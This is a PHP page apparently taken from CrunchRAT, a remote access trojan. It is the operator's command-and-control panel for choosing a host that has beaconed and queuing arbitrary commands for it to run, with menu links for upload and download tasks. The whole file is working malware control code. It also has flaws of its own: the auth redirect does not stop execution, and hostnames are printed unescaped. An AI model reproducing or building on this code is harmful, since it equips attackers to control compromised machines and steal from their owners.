<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
      <ul class="nav navbar-nav">
        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
        <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
        <li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
            <li><a href="tasks.php">View Tasks</a></li>
            <li><a href="command.php">Task Command</a></li>
            <li><a href="upload.php">Task Upload</a></li>
            <li><a href="download.php">Task Download</a></li>
          </ul>
        </li> <!-- End of "Task" drop-down menu -->

        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
          <ul class="dropdown-menu">
            <li><a href="addUser.php">Add User</a></li>
            <li><a href="changePassword.php">Change Password</a></li>
            <li role="separator" class="divider"></li>
            <li><a href="logout.php">Logout</a></li>
          </ul>
        </li> <!-- End of "Account Management" drop-down menu -->
        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
      </ul>
    </nav> <!-- End of navigation bar -->

    <div class="container"> <!-- Start of main body container -->
      <form role="form" class="form-inline" method="post"> <!-- Start of task command form -->
        <select name="hostname">
        <?php
          # Determines the hosts that have previously beaconed
          $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
          $statement->execute();
          $hosts = $statement->fetchAll();

          # Kills database connection
          $statement->connection = null; 
            
          # Populates each <option> drop-down with our hosts that have beaconed previously
          foreach($hosts as $row)
          {
            echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . $row["hostname"] . "</option>";
          }
        ?>
        </select>
        <input type="text" style="width: 400px;" class="form-control" name="command" placeholder="Command">
        <button type="submit" name="submit" class="btn btn-default">Task Command</button>
      </form> <!-- End of task command form -->

      <?php
        # If the user clicked "Task Command"
        if (isset($_POST["submit"]))
        {
          # If all fields are set
          # Prevent null entries from being added to the "tasks" table
          if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["command"]) && !empty($_POST["command"]))
          {
            $hostname = $_POST["hostname"]; # Hostname that was selected
            $command = $_POST["command"];   # Command that was entered
            $username = $_SESSION["username"]; # Current logged in user

            # Inserts user, action, hostname, and secondary into "tasks" table
            $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
            $statement->bindValue(":user", $username);
            $statement->bindValue(":action", "command");
            $statement->bindValue(":hostname", $hostname);
            $statement->bindValue(":secondary", $command);  
            $statement->execute();

            # Inserts usern, hostname, action, secondary, and status into "output" table
            $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
            $statement->bindValue(":user", $username);
            $statement->bindValue(":hostname", $hostname);
            $statement->bindValue(":action", "command");
            $statement->bindValue(":secondary", $command);
            $statement->bindValue(":status", "N");
            $statement->execute();

            # Kills database connection
            $statement->connection = null;

            # Displays success message - "Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page."
            echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page.</div>";

            # Waits 3 seconds, then redirects to commandSubmit.php
            # This is a hack to clear out the POST data
            header('Refresh: 3; URL=commandSubmit.php');
          }
          else
          {
            # Displays error message - "Please fill out all fields."
            echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
          }
        }
      ?>
    </div> <!-- End main body container -->
  </body> <!-- End of body -->
</html>
